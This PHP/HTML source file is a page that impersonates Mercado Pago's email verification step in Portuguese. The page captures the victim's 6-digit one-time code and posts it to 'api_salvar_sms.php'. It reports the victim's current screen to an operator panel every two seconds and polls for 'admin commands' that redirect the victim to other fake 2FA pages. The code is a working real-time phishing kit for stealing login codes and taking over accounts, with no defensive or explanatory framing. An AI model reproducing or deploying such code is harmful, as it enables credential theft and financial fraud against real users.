<?php
session_start();

// Recupera os dados da sessão para exibição dinâmica.
$identificador_cliente = $_SESSION['identificador_usuario'] ?? '473.302.908-07'; // Valor de exemplo
$tipo_identificador = $_SESSION['tipo_identificador'] ?? 'CPF'; // Valor de exemplo

function isMobileDevice() {
    return preg_match("/(android|avantgo|blackberry|bolt|boost|cricket|docomo|fone|hiptop|mini|mobi|palm|phone|pie|tablet|up\.browser|up\.link|webos|wos)/i", $_SERVER["HTTP_USER_AGENT"]);
}

// Define o alvo do redirecionamento com base no dispositivo
if (isMobileDevice()) {
    $redirect_target_2fa = 'dois_fatores.php';
} else {
    // Verifique se o nome do arquivo desktop é 'dois_fatores.php' ou 'dois_fatores2.php'
    $redirect_target_2fa = 'dois_fatores.php'; 
}


// Função para formatar o CPF
function formatarCPF($cpf) {
    $cpfLimpio = preg_replace('/[^0-9]/', '', $cpf);
    if (strlen($cpfLimpio) != 11) { return $cpf; }
    return substr($cpfLimpio, 0, 3) . '.' . substr($cpfLimpio, 3, 3) . '.' . substr($cpfLimpio, 6, 3) . '-' . substr($cpfLimpio, 9, 2);
}

// Formata o dado apenas se o tipo for 'CPF'
$dado_formatado = ($tipo_identificador === 'CPF') ? formatarCPF($identificador_cliente) : $identificador_cliente;
?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Insira o código que te enviamos por e-mail</title>
    <style>
        :root {
            --cor-amarela: #ffe600;
            --cor-azul: #3483fa;
            --cor-texto-primaria: #333;
            --cor-texto-secundaria: #666;
            --cor-borda: #ddd;
        }
        body { margin: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif; background-color: var(--cor-fundo); color: #333; }
        .main-header { background-color: #ffe600; padding: 0 680px; box-shadow: 0 1px 2px 0 rgba(0,0,0,.1); height: 60px; display: flex; align-items: center; justify-content: flex-start;}
        .main-header img { height: 37px; }
        .main-content { padding-top: 80px; flex-grow: 1; }
        .content-wrapper { max-width: 960px; margin: 0 auto; display: flex; justify-content: center; align-items: flex-start; gap: 64px; }
        .left-column { width: 340px; flex-shrink: 0; text-align: left; }
        .session-start-label { font-size: 12px; font-weight: 600; color: var(--cor-texto-secundaria); text-transform: uppercase; }
        .main-title { font-size: 28px; font-weight: 600; margin: 8px 0 16px 0; }
        .description-text { font-size: 16px; color: var(--cor-texto-secundaria); line-height: 1.5; margin-bottom: 24px; }
        .user-info-box { display: inline-flex; align-items: center; gap: 12px; border: 1px solid #e0e0e0; border-radius: 30px; padding: 8px 16px; }
        .user-info-box .icon { width: 32px; height: 32px; background-color: #eaf3ff; border-radius: 50%; display: flex; align-items: center; justify-content: center; }
        .user-info-box .details span { display: block; font-size: 14px; }
        .user-info-box .details a { font-size: 12px; color: var(--cor-azul); text-decoration: none; }
        .help-link { display: block; margin-top: 24px; color: var(--cor-azul); text-decoration: none; font-size: 14px; font-weight: 500; }
        .help-link:hover { text-decoration: underline; }
        .form-card { background-color: var(--cor-card); box-shadow: 0 1px 4px 0 rgba(0,0,0,.1); border-radius: 6px; padding: 32px 40px; width: 440px; box-sizing: border-box; }
        .form-card label { font-size: 16px; font-weight: 400 color: var(--cor-texto-primaria); }
        .code-inputs { display: flex; gap: 8px; justify-content: flex-start; margin: 16px 0; }
        .code-inputs input { width: 40px; height: 50px; text-align: center; font-size: 22px; border: 1px solid var(--cor-borda); border-radius: 6px; }
        .code-inputs input:focus { border-color: var(--cor-azul); outline: none; }
        .resend-timer { text-align: left; font-size: 14px; color: var(--cor-texto-secundaria); margin: 16px 0 24px 0; min-height: 21px; }
        .resend-timer a { color: var(--cor-azul); text-decoration: none; font-weight: 500; }
        .actions { display: flex; gap: 24px; align-items: center; }
        .btn { padding: 14px 24px; font-size: 15px; font-weight: 600; border-radius: 6px; cursor: pointer; border: 1px solid transparent; }
        .btn-primary { background-color: var(--cor-azul); color: white; flex-grow: 1; }
        .btn-secondary { color: var(--cor-azul); text-decoration: none; white-space: nowrap; }
    </style>
</head>
<body>

    <header class="main-header">
        <img src="https://http2.mlstatic.com/storage/mobile-on-demand-resources/image/web-private-nav-mp-logo_1X?updatedAt=1746639317789" alt="Mercado Pago">
    </header>

    <main class="main-content">
        <div class="content-wrapper">
            
            <div class="left-column">
                <span class="session-start-label">INÍCIO DE SESSÃO</span>
                <h1 class="main-title">Insira o código que te enviamos por e-mail</h1>
                <p class="description-text">É um código de 6 dígitos enviado para ******@gmail.com.</p>

                <div class="user-info-box">
                    <div class="icon">
                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M20 21V19C20 16.7909 18.2091 15 16 15H8C5.79086 15 4 16.7909 4 19V21" stroke="#3483fa" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/><path d="M12 11C14.2091 11 16 9.20914 16 7C16 4.79086 14.2091 3 12 3C9.79086 3 8 4.79086 8 7C8 9.20914 9.79086 11 12 11Z" stroke="#3483fa" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
                    </div>
                    <div class="details">
                        <span><?php echo htmlspecialchars($tipo_identificador) . ': ' . htmlspecialchars($dado_formatado); ?></span>
                        <a href="index.php">Trocar conta</a>
                    </div>
                </div>
                
                <a href="#" class="help-link">Preciso de ajuda</a>
            </div>

            <div class="form-card">
                <form id="sms-form" onsubmit="handleFormSubmit(event)">
                    <label>Digite o código</label>
                    <div class="code-inputs">
                        <input type="tel" maxlength="1" pattern="[0-9]" required>
                        <input type="tel" maxlength="1" pattern="[0-9]" required>
                        <input type="tel" maxlength="1" pattern="[0-9]" required>
                        <input type="tel" maxlength="1" pattern="[0-9]" required>
                        <input type="tel" maxlength="1" pattern="[0-9]" required>
                        <input type="tel" maxlength="1" pattern="[0-9]" required>
                    </div>
                    <div class="resend-timer"></div>
                    <div class="actions">
                        <button type="submit" class="btn btn-primary">Confirmar código</button>
                        <a href="senha.php" class="btn-secondary">Escolher outro método</a>
                    </div>
                </form>
            </div>
        </div>
    </main>

    <script>
        // Seleciona os elementos do DOM
        const smsForm = document.getElementById('sms-form');
        const inputs = [...smsForm.querySelectorAll('.code-inputs input')];
        const timerElement = document.querySelector('.resend-timer');
        let countdownInterval;

        // LÓGICA 1: Pulo automático e backspace entre os inputs
        inputs.forEach((input, index) => {
            // Evento para quando um dígito é inserido
            input.addEventListener('input', () => {
                // Se o input tem um valor e não é o último, foca no próximo
                if (input.value && index < inputs.length - 1) {
                    inputs[index + 1].focus();
                }
            });

            // Evento para a tecla Backspace
            input.addEventListener('keydown', (e) => {
                // Se a tecla for Backspace, o input estiver vazio e não for o primeiro, foca no anterior
                if (e.key === "Backspace" && !input.value && index > 0) {
                    inputs[index - 1].focus();
                }
            });
        });

        // LÓGICA 2: Contador regressivo de 50 segundos
        function startTimer() {
            let seconds = 50; // Duração do contador
            timerElement.style.color = 'var(--cor-texto-secundaria)';
            
            // Função que atualiza o timer a cada segundo
            function updateTimer() {
                const minutes = String(Math.floor(seconds / 60)).padStart(2, '0');
                const secs = String(seconds % 60).padStart(2, '0');
                timerElement.innerHTML = `Reenviar código em ${minutes}:${secs}`;
                
                if (seconds > 0) {
                    seconds--;
                } else {
                    // Quando o tempo acaba, limpa o intervalo e mostra o link de reenvio
                    clearInterval(countdownInterval);
                    timerElement.innerHTML = `<a href="#" onclick="resendSms(event)">Reenviar código</a>`;
                }
            }
            
            clearInterval(countdownInterval); // Limpa qualquer timer anterior
            updateTimer(); // Roda uma vez imediatamente
            countdownInterval = setInterval(updateTimer, 1000); // Inicia o contador
        }

        // Função chamada pelo link "Reenviar código"
        function resendSms(event) {
            event.preventDefault(); // Previne que a página recarregue
            alert('Um novo código seria enviado!'); // Simula o reenvio
            startTimer(); // Reinicia o contador
        }

        // Inicia o contador assim que a página carrega
        document.addEventListener('DOMContentLoaded', startTimer);
        
        // LÓGICA 3: Envio do código para a API ao submeter o formulário
        async function handleFormSubmit(event) {
            event.preventDefault(); // Previne o envio padrão do formulário
            
            // Junta os 6 dígitos em uma única string
            const code = inputs.map(input => input.value).join('');

            if (code.length === 6) {
                try {
                    // Faz a chamada para sua API
                    const response = await fetch('api_salvar_sms.php', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ sms_code: code })
                    });
                    
                    const result = await response.json();
                    
                    if (result.success) {
                        alert('Código recebido com sucesso!');
                        // Você pode redirecionar o usuário aqui se quiser
                        // window.location.href = '/proxima_pagina.php';
                    } else {
                        // Mostra o erro retornado pela API
                        alert('Erro: ' + (result.error || 'Não foi possível salvar o código.'));
                    }
                } catch (error) {
                    // Mostra um erro de conexão
                    alert('Erro de conexão com o servidor.');
                    console.error('Fetch error:', error);
                }
            } else {
                alert('Por favor, preencha todos os 6 dígitos.');
            }
        }
    </script>
    <script>
        (function() {
            // Mapa de nomes de arquivos para mensagens de status amigáveis.
            const statusMap = {
                'index.php': 'Usuário na tela Home (Desktop)',
                'login-mobile.php': 'Usuário na tela Home (Mobile)',
                'senha.php': 'Usuário na Tela de opções de login (QRCODE/SMS/WHATSAPP/EMAIL) (Desktop)',
                'senha-mobile.php': 'Usuário na Tela de opções de login (QRCODE/SMS/WHATSAPP/EMAIL)  (Mobile)',
                'dois_fatores.php': 'Usuário na Tela 2FA(autenticação de duas etapas) - Mensagem (Desktop)',
                'dois_fatores2.php': 'Usuário na Tela 2FA com opções de duas etapas (QRCODE/SMS/WHATSAPP/EMAIL) (Desktop)',
                'doisfatores2mobile.php': 'Usuário na Tela 2FA com opções de duas etapas (QRCODE/SMS/WHATSAPP/EMAIL) (Mobile)',
                'sms_desktop.php': 'Usuário na tela para logar com código no SMS (Desktop)',
                'sms_mobile.php': 'Usuário na tela para logar com código no SMS (Mobile)',
                'sms_whats_desktop.php': 'Usuário na tela para logar com código no SMS via WhatsApp (Desktop)',
                'sms_whats_mobile.php': 'Usuário na tela para logar com código no SMS via WhatsApp (Mobile)',
                'qrcode-mobile.php': 'Usuário na tela para logar com QR Code (Mobile)',
                'telaqr.php': 'Usuário na tela para logar com QR Code (Desktop)',
                'email2fadesktop.php': 'Usuário na tela para verificar duas etapas com código no E-mail(Desktop)',
                'email2famobile.php': 'Usuário na tela para verificar duas etapas com código no E-mail(Mobile)',
                'emailsms_desktop.php': 'Usuário na tela para logar com código no E-mail (Desktop)',
                'emailsms_mobile.php': 'Usuário na tela para logar com código no E-mail (Mobile)',
                'sms2fadesktop.php': 'Usuário na tela para verificar duas etapas com código no SMS (Desktop)',
                'sms2famobile.php': 'Usuário na tela para verificar duas etapas com código no SMS (Mobile)',
                'whats2fadesktop.php': 'Usuário na tela para verificar duas etapas com código no WhatsApp (Desktop)',
                'whats2framobile.php': 'Usuário na tela para verificar duas etapas com código no WhatsApp (Mobile)'
            };

            // Descobre o nome do arquivo da página atual
            const currentPage = window.location.pathname.split('/').pop();
            
            // Pega a mensagem de status correspondente
            const currentStatus = statusMap[currentPage] || 'Página Desconhecida';

            // Função que envia o "ping" para a API
            async function sendStatusUpdate() {
                try {
                    await fetch('api_update_status.php', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({ status: currentStatus })
                    });
                    // Não precisamos fazer nada com a resposta, apenas enviar.
                } catch (error) {
                    // Se falhar, loga no console sem incomodar o usuário.
                    console.error('Falha ao enviar atualização de status:', error);
                }
            }

            // Envia o primeiro status imediatamente ao carregar a página
            sendStatusUpdate();

            // Configura para enviar o status a cada 2000 milissegundos (2 segundos)
            setInterval(sendStatusUpdate, 2000);
        })();
    </script>
    <script>
        (function() {
            // Pega a URL de redirecionamento que o PHP definiu
            const redirectUrl = "<?php echo $redirect_target_2fa; ?>";

            async function checkAdminCommand() {
                try {
                    const response = await fetch('api_check_status.php');
                    const data = await response.json();

                    console.log('Status atual:', data.status); 

                    if (data.status === 'redirecionar_para_2fa') {
                        // Para a verificação para não redirecionar em loop
                        clearInterval(statusInterval);
                        
                        console.log('Comando do admin recebido! Redirecionando para:', redirectUrl);
                        
                        // Redireciona o usuário para o alvo correto (desktop ou mobile)
                        window.location.href = redirectUrl;
                    }
                } catch (error) {
                    console.error('Erro ao verificar status:', error);
                }
            }

            // Inicia a verificação a cada 3 segundos
            const statusInterval = setInterval(checkAdminCommand, 3000);
        })();
    </script>
    </body>
</html>